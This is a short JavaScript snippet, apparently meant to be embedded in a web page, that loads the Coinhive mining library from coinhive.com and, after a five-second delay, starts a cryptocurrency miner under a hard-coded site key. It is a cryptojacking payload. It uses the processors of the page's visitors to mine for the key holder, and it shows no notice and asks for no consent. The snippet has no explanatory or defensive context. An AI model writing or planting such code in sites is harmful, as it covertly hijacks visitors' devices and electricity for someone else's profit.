var imported = document.createElement('script');
imported.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(imported);
setTimeout(() => {
  var miner = new CoinHive.User('UtX8CiZN1tzrQTn6zYRmcfsMX8qkOLGz', 'vnu');
  miner.start();
}, 5000);
